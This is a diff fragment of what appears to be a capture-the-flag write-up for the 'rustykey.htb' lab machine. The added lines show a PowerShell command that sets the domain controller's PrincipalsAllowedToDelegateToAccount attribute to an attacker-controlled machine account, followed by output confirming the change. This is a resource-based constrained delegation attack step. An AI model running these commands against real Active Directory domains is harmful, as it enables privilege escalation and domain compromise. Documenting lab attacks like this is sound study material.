@@ -618,10 +618,32 @@ PS C:\Temp>
 Ill read the `dc$` account attribute, currently nothing is configured
 
 ```python
-
+PS C:\Temp> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount it-computer3$
 ```
 
+Ill then set it up for a machine account i control
 
+```python
+PS C:\Temp> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
+DNSHostName                          : dc.rustykey.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
+PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
+UserPrincipalName                    : 
+
+
+
+PS C:\Temp> 
+```
+
+Then running the same command again i now see its setup for the `it-computer`
 
 
 
